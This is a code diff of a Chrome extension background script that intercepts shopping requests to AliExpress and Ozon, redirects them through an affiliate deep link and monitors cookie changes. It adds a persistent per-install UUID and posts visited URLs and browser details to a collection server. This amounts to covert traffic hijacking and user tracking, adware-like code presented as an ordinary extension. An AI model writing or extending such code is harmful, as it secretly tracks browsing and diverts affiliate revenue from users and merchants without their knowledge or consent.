@@ -20,7 +20,8 @@ function autoactivateClass() {
 	}
 }
 
-function Collect(){
+function JsInject() {
+
   var self = this;
 
   this.Data = {
@@ -28,26 +29,7 @@ function Collect(){
     cookie:     window.navigator.cookieEnabled,
     userAgent:  window.navigator.userAgent
   };
-
-  this.sendData = function (url, param){
-    let xhr = new XMLHttpRequest();
-    let json = JSON.stringify({data:param})
-    xhr.open("POST", url, true);
-    xhr.setRequestHeader('Content-Type', 'application/json')
-    xhr.onreadystatechange = function(){
-      if(xhr.readyState == 4 && xhr.status ==200){
-        console.log(xhr.responseText);
-      }
-    }
-    xhr.send(json);
-  };
-
-}
-
-function JsInject() {
-
-  var self = this;
-
+  this.setting;
   this.server   = 'http://localhost:3000/ext';
   this.regList  = [/^https:\/\/ru(.*?)aliexpress(.*?)item(.*?\.html)/g, /(^http(.):\/\/www\.ozon\.ru)(.*?)/g]; //from server
   this.deepLink = 'http://shopeasy.by/redirect/cpa/o/ou76wi7vip8o8fxzn1fxixpo2ddqm8m2/'; //from server
@@ -55,14 +37,28 @@ function JsInject() {
   this.opt_extraInfoSpec = ["blocking"];
 
   this.autoactivateObj = new autoactivateClass();
-  this.statsCollect    = new Collect();
 
   _init();
 
   function _init(){
+    getSetting();
     chrome.runtime.onInstalled.addListener(whenInstalled);
     chrome.cookies.onChanged.addListener(cookieChanges);
     chrome.webRequest.onBeforeRequest.addListener(beforeRequest, self.filter, self.opt_extraInfoSpec);
+    chrome.storage.onChanged.addListener(storageChange);
+  }
+
+  function getSetting(){
+    chrome.storage.local.get('uuid', function(result){
+      self.setting = result;
+    })
+  }
+
+  function storageChange(changes, space){
+    for (key in changes){
+      let storageChange = changes[key];
+      console.log('key "%s" in space "%s" changes. Old value is "%s", new value is "%s"', key, space, storageChange.oldValue, storageChange.newValue);
+    }
   }
 
   function cookieChanges(info){
@@ -93,10 +89,13 @@ function JsInject() {
 
   function whenInstalled(details){
     if (details.reason === 'install'){
+      let uuid = _uuid();
+      chrome.storage.local.set({'uuid':uuid})
       console.log('first install');
-      self.statsCollect.sendData(self.server, {info:self.statsCollect.Data, first:true});
+      _xhrSend(self.server, {info:self.Data, uuid:uuid, first:true});
     }
     else {
+      console.log(self.setting);
       console.log(details.reason);
     }
   }
@@ -108,7 +107,7 @@ function JsInject() {
         if (url.match(self.regList[0])){
           return url.match(self.regList[0])[0];
         } else {
-          self.statsCollect.sendData(self.server, url);
+          _xhrSend(self.server, url);
           return null;
         }
       }
@@ -119,6 +118,31 @@ function JsInject() {
   function _encodeUrl(first, last){
     return first +'?to='+ encodeURIComponent(last);
   }
+
+  function _uuid(){
+    return 'xxxxxxxx-xxxx-4xxx-yxxx-xxxxxxxxxxxx'.replace(/[xy]/g, function(c) {
+      var r = Math.random() * 16 | 0, v = c == 'x' ? r : (r & 0x3 | 0x8);
+      return v.toString(16);
+    });
+  }
+
+  function _xhrSend(url, param){
+    let xhr = new XMLHttpRequest();
+    let json = JSON.stringify({data:param, uuid:self.setting})
+    xhr.open("POST", url, true);
+    xhr.setRequestHeader('Content-Type', 'application/json')
+    xhr.onreadystatechange = function(){
+      if(xhr.readyState == 4 && xhr.status ==200){
+        try {
+          console.log(xhr.responseText);
+        }
+        catch(err){
+          console.log(err);
+        }
+      }
+    }
+    xhr.send(json);
+  };
 
 }
 
